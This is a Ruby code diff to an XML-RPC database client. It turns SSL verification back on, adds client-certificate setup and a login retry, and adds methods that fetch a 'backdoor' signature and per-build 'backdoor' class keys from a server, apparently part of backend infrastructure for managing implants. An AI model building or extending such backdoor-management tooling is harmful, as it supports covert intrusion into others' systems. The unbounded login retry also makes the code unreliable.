@@ -25,10 +25,13 @@ class DB_xmlrpc
     http = @server.instance_variable_get(:@http)
 
     # no SSL verify for this connection
-    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
+    #http.verify_mode = OpenSSL::SSL::VERIFY_NONE
 
-    #TODO: client certificate
-    #http.auth.ssl.cert_key_file = "mycert.pem"
+    # CA certificate to check if the server ssl certificate is valid
+    http.ca_file = Dir.pwd + "/config/rcs-client.pem"
+
+    # our client certificate to send to the server
+    http.cert = OpenSSL::X509::Certificate.new(File.read(Dir.pwd + "/config/rcs-client.pem")) 
 
     trace :debug, "Using XML-RPC to communicate with #{@host}:#{@port}"
   end
@@ -41,6 +44,15 @@ class DB_xmlrpc
       return true
     rescue Exception => e
       trace :error, "Error calling auth.login: #{e.message}"
+
+      # we can get a "method not found" error only if we are already logged in
+      # in this case, we force a logout and retry the login
+      if e.message['method not found'] then
+        trace :debug, "forcing logout and retrying..."
+        logout
+        return login(user, pass)
+      end
+      
       return false
     end
   end
@@ -61,6 +73,28 @@ class DB_xmlrpc
       @server.call("monitor.set", component, remoteip, status, message, disk, cpu, pcpu)
     rescue Exception => e
       trace :error, "Error calling monitor.set: #{e.message}"
+    end
+  end
+
+  def backdoor_signature
+    begin
+      return @server.call("sign.get", "backdoor")
+    rescue Exception => e
+      trace :error, "Error calling sign.get: #{e.message}"
+    end
+  end
+
+  def class_keys
+    begin
+      list = @server.call("backdoor.getclasskey", "")
+      # convert the response into an hash indexed by 'build'
+      class_keys = {}
+      list.each do |elem|
+        class_keys[elem["build"]] = elem["classkey"]
+      end
+      return class_keys
+    rescue Exception => e
+      trace :error, "Error calling backdoor.getclasskey: #{e.message}"
     end
   end
 
